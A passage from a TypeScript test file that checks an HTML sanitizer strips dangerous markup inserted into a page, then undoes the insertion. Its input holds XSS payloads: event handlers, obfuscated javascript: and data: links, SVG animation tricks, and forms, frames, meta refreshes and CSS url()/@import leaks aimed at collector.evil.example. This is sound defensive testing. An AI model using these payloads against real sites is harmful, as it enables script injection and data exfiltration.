    const p = open("", { html: '<!doctype html><html><head><title>Plain</title></head><body><p id="first">first</p></body></html>', url: "https://www.acme.example/plain.html" });
    const html = [
      '<div id="banner" onclick="steal()" style="padding:8px">Hello <b onmouseover="x()">there</b></div>',
      "<script>steal()</script>",
      '<img id="pic" src="https://www.acme.example/logo.png" onerror="steal()" />',
      '<a id="bad1" href="javascript:steal()">one</a>',
      '<a id="bad2" href="  JaVaScRiPt:steal()">two</a>',
      '<a id="bad3" href="jav\tascri\npt:steal()">three</a>',
      '<a id="bad4" href="data:text/html,<script>steal()</script>">four</a>',
      '<a id="good" href="https://www.acme.example/help">help</a>',
      '<form id="form" action="https://collector.evil.example/"><input id="in" name="q" /><button id="btn">Go</button></form>',
      '<textarea id="ta"></textarea><select id="sel"><option>a</option></select>',
      '<iframe id="frame" src="https://collector.evil.example/"></iframe><object id="obj" data="x"></object><embed id="emb" src="x" />',
      '<link id="link" rel="stylesheet" href="https://collector.evil.example/x.css" /><meta id="meta" http-equiv="refresh" content="0;url=https://collector.evil.example/" /><base id="base" href="https://collector.evil.example/" />',
      '<style id="leak">input[value^="a"]{background:url(https://collector.evil.example/a)}</style>',
      '<style id="imp">@import "https://collector.evil.example/x.css";</style>',
      '<style id="plain">#banner{color:red}</style>',
      '<svg id="svg"><a id="svga"><animate id="anim" attributeName="href" values="javascript:steal()" /><set id="set" attributeName="href" to="javascript:steal()" /><text>x</text></a></svg>',
    ].join("");
    const r = page.pageMain({ op: "insertHtml", html, position: "top" }) as { ok: boolean };
    const wrap = p.doc._flat().find((e: { _ga(n: string): string | null }) => e._ga("data-trinity") === "html") as unknown as { parentNode: { firstChild: unknown; localName: string } } | undefined;
    const gone = ["form", "in", "btn", "ta", "sel", "frame", "obj", "emb", "link", "meta", "base", "leak", "imp", "anim", "set"].filter((id) => p.$(id));
    check("added markup: it goes in at the top of the page, marked as Trinity's", r.ok === true && Boolean(wrap) && wrap!.parentNode.localName === "body" && wrap!.parentNode.firstChild === wrap, J(r));
    check("added markup: scripts, frames, objects, links, meta, base, forms and every kind of field are taken out", gone.length === 0 && !p.doc._flat().some((e: El) => e.localName === "script"), `left: ${gone.join(",")}`);
    check("added markup: a style sheet that fetches (url(), @import) is taken out; a plain one stays", !p.$("leak") && !p.$("imp") && Boolean(p.$("plain")));
    check("added markup: animations that could write a script address in are taken out", !p.$("anim") && !p.$("set") && Boolean(p.$("svga")));
    check("added markup: no handler survives", ["banner", "pic"].every((id) => p.$(id) && p.$(id).getAttribute("onclick") === null && p.$(id).getAttribute("onerror") === null) && !p.doc._flat().some((e: { getAttributeNames(): string[] }) => e.getAttributeNames().some((n) => /^on/i.test(n))));
    check("added markup: script: and data: addresses are taken off — however they are spelt", ["bad1", "bad2", "bad3", "bad4"].every((id) => p.$(id) && p.$(id).getAttribute("href") === null), ["bad1", "bad2", "bad3", "bad4"].map((id) => `${id}=${J(p.$(id)?.getAttribute("href"))}`).join(" "));
    check("added markup: what is harmless stays as written", p.$("good").getAttribute("href") === "https://www.acme.example/help" && p.$("pic").getAttribute("src") === "https://www.acme.example/logo.png" && p.$("banner").getAttribute("style") === "padding:8px" && /Hello/.test(p.$("banner").textContent));
    const undone = page.pageMain({ op: "removeInjected" }) as { ok: boolean; removed: number };
    check("added markup: undo takes it all out again", undone.removed === 1 && !p.$("banner") && Boolean(p.$("first")), J(undone));
    p.leave();
  }
}

if (process.argv[1] && pathToFileURL(process.argv[1]).href === import.meta.url) {
  let fails = 0;
  let passes = 0;
  await runPageTests((name, ok, detail = "") => {
    if (ok) passes++;
    else fails++;
    console.log(`${ok ? "PASS" : "FAIL"} ${name}${detail ? `  — ${detail.slice(0, 400)}` : ""}`);
  });
  console.log(`\n${passes} passed, ${fails} failed`);
  console.log(fails ? `\n${fails} FAILED` : "\nALL PASSED");
  process.exit(fails ? 1 : 0);
}
